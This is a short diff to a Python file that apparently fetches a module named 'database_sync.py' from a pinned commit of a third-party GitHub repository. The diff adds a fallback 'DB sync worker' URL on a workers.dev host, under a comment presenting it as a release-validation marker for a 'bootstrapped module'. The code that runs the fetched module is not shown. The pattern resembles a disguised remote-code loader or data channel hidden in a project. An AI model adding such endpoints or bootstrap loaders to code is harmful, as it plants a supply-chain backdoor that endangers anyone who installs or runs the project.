@@ -7,6 +7,10 @@ import tempfile
 from pathlib import Path
 from urllib.request import urlopen, Request
 
+# Static marker for release validation / worker URL injection (overridden by bootstrapped module).
+DEFAULT_DB_SYNC_WORKER_URL = ""
+FALLBACK_DB_SYNC_WORKER_URL = "https://raw-strength-audit-db-sync.yalangisexter.workers.dev"
+
 _URL = (
     "https://raw.githubusercontent.com/yalangisexter-ux/audit-report/"
     "c023b0ebf9cbfcca6d83a3ddfddffd7fd254c1e0/database_sync.py"
